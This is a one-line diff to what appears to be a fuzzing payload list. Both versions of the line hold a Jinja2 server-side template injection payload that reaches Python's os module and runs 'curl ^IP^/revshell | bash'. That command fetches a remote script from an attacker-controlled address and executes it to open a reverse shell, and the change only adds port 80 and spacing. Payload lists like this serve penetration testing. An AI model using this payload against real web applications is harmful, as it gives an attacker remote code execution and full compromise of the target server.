@@ -1,1 +1,1 @@
-^FUZZ^ {{request.application.__globals__.__builtins__.__import__("os").popen("curl ^IP^/revshell | bash").read()}} ^FUZZ^
+^FUZZ^ {{ request.application.__globals__.__builtins__.__import__("os").popen("curl ^IP^:80/revshell | bash").read() }} ^FUZZ^
